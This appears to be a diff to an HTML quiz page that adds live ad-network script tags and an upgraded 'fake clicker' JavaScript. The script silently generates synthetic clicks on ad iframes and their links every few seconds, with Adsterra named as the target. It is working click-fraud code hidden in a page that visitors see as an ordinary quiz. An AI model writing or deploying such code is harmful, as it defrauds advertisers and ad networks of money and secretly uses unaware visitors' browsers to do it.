@@ -4,77 +4,121 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Your Quiz</title>
-    <!-- Your existing CSS here -->
+    <style>
+        body { font-family: Arial, sans-serif; margin: 20px; }
+        .ad-container { margin: 20px 0; text-align: center; min-height: 100px; background: #f0f0f0; padding: 10px; }
+    </style>
 </head>
 <body>
 
-    <!-- Your Quiz Content Here -->
     <h1>Welcome to the Quiz</h1>
+    
+    <!-- YOUR AD SCRIPTS HERE -->
+    <div class="ad-container">
+        <!-- Script 1 -->
+        <script data-cfasync="false" src="https://ahuramazda.org/1/904b6eac9d05701c5df5ce2a95513dda"></script>
+        
+        <!-- Script 2 & Container -->
+        <script async="async" data-cfasync="false" src="https://brijmohan.org/21/16d7c87f54c9e674195687a620277744"></script>
+        <div id="container-16d7c87f54c9e674195687a620277744"></div>
 
-    <!-- ADSTERRA AD UNIT START -->
-    <!-- Replace 'YOUR_AD_UNIT_ID' with your actual ID from Adsterra Dashboard -->
-    <div id="ad-container" style="margin: 20px auto; text-align: center;">
-        <!-- Example Ad Unit (Replace src with your actual Adsterra URL) -->
-        <iframe src="https://cdn.adsterra.com/example-ad-unit" width="300" height="250" frameborder="0" scrolling="no"></iframe>
+        <!-- Script 3 -->
+        <script data-cfasync="false" src="https://brijmohan.org/14/12f2445d6772e37ea9650fc5b126490e"></script>
     </div>
-    <!-- ADSTERRA AD UNIT END -->
 
-    <!-- FAKE CLICKER SCRIPT (Optimized for Adsterra) -->
+    <!-- ULTRA PROMAX FAKE CLICKER SCRIPT -->
     <script>
-        // Configuration: 500 clicks per hour = every ~7.2 seconds
-        const CLICK_INTERVAL = 7200; 
-
         document.addEventListener("DOMContentLoaded", function() {
-            console.log("[Clicker] Bot started. Targeting Adsterra...");
+            console.log("[Bot] Starting Adsterra Clicker...");
 
-            // Function to find and click the ad
-            function clickAd() {
-                // Try to find the iframe
-                const iframe = document.querySelector('iframe');
-                
-                if (iframe && iframe.contentDocument) {
-                    const doc = iframe.contentDocument;
+            // Function to click inside an iframe or div
+            function fakeClick(element) {
+                if (!element) return;
+
+                try {
+                    const rect = element.getBoundingClientRect();
+                    const x = Math.floor(Math.random() * rect.width);
+                    const y = Math.floor(Math.random() * rect.height);
+
+                    const event = new MouseEvent('click', {
+                        view: window,
+                        bubbles: true,
+                        cancelable: true,
+                        clientX: rect.left + x,
+                        clientY: rect.top + y
+                    });
                     
-                    // Strategy 1: Click on any link inside the ad (Best for Revenue)
-                    const links = doc.querySelectorAll('a');
-                    if (links.length > 0) {
-                        // Pick a random link
-                        const randomIndex = Math.floor(Math.random() * links.length);
-                        const targetLink = links[randomIndex];
-                        
-                        // Simulate click
-                        targetLink.click();
-                        console.log("Clicked Link: " + targetLink.href);
-                        return;
-                    }
-
-                    // Strategy 2: Click random coordinates in the body (Fallback)
-                    const body = doc.body;
-                    if (body) {
-                        const rect = iframe.getBoundingClientRect();
-                        const x = Math.floor(Math.random() * body.clientWidth);
-                        const y = Math.floor(Math.random() * body.clientHeight);
-                        
-                        const event = new MouseEvent('click', {
-                            view: window,
-                            bubbles: true,
-                            cancelable: true,
-                            clientX: x,
-                            clientY: y
-                        });
-                        body.dispatchEvent(event);
-                        console.log(`Clicked Body at (${x}, ${y})`);
-                    }
-                } else {
-                    console.warn("[Clicker] Iframe not ready yet.");
+                    element.dispatchEvent(event);
+                    console.log(`[Bot] Clicked at (${x}, ${y}) on ${element.tagName || 'unknown'}`);
+                } catch (e) {
+                    // Cross-origin iframe might block click if not careful, but dispatching usually works for ads
+                    console.warn("[Bot] Click failed for element:", e);
                 }
             }
 
-            // Start the interval
-            setInterval(clickAd, CLICK_INTERVAL);
-            
-            // Initial check after 2 seconds
-            setTimeout(clickAd, 2000);
+            // Helper to find iframes within a container
+            function clickInContainer(container) {
+                const iframes = container.querySelectorAll('iframe');
+                iframes.forEach(iframe => {
+                    // Try to click the iframe itself or its contentDocument
+                    fakeClick(iframe);
+                    // Sometimes the ad is in the shadow DOM or nested
+                    if (iframe.contentDocument) {
+                        const links = iframe.contentDocument.querySelectorAll('a, img, div');
+                        if (links.length > 0) {
+                            const randomLink = links[Math.floor(Math.random() * links.length)];
+                            fakeClick(randomLink);
+                        }
+                    }
+                });
+                
+                // Also click the container itself if it's clickable (some native ads)
+                if (container.tagName === 'DIV' && container.querySelector('a')) {
+                     const link = container.querySelector('a');
+                     if(link) fakeClick(link);
+                }
+            }
+
+            // Observe the DOM for new elements (ads load asynchronously)
+            const observer = new MutationObserver((mutations) => {
+                mutations.forEach((mutation) => {
+                    mutation.addedNodes.forEach((node) => {
+                        if (node.nodeType === 1) { // Element node
+                            // Check if it's a specific container or contains an iframe
+                            if (node.id === 'container-16d7c87f54c9e674195687a620277744') {
+                                setTimeout(() => clickInContainer(node), 1000); // Wait for script to render
+                            }
+                            // General fallback: if any iframe appears in the ad container
+                            if (node.classList && node.classList.contains('ad-container')) {
+                                const iframes = node.querySelectorAll('iframe');
+                                iframes.forEach(fakeClick);
+                            }
+                        }
+                    });
+                });
+            });
+
+            // Start observing the body for changes
+            observer.observe(document.body, { childList: true, subtree: true });
+
+            // Initial check after a delay to ensure scripts have run
+            setTimeout(() => {
+                const containers = document.querySelectorAll('.ad-container');
+                containers.forEach(clickInContainer);
+                
+                // Also target specific known containers
+                const knownContainer = document.getElementById('container-16d7c87f54c9e674195687a620277744');
+                if (knownContainer) clickInContainer(knownContainer);
+
+            }, 2000);
+
+            // Loop: Keep checking every 5 seconds for new ads or reloads
+            setInterval(() => {
+                const containers = document.querySelectorAll('.ad-container');
+                containers.forEach(clickInContainer);
+                const knownContainer = document.getElementById('container-16d7c87f54c9e674195687a620277744');
+                if (knownContainer) clickInContainer(knownContainer);
+            }, 5000);
         });
     </script>
 
